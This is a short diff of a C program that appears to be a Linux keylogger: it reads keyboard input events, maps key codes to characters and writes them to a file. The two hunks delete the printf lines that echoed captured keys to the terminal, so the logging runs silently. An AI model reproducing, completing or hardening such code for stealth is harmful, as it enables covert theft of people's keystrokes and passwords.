@@ -16,7 +16,6 @@ int main(int argc, char **argv){
 
     strcat(dest, filepath);
     strcat(dest, event);
-    printf("%s\n", dest);
 
     char *map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'\\..zxcvbnm,./";
     struct input_event ev;
@@ -27,7 +26,6 @@ int main(int argc, char **argv){
         read(fd, &ev, sizeof(ev));
         if ((ev.type == EV_KEY) && (ev.value == 0)){
             fflush(fp);
-            printf("%c\n", map[ev.code]);
             switch (ev.code)
             {
             case 28:
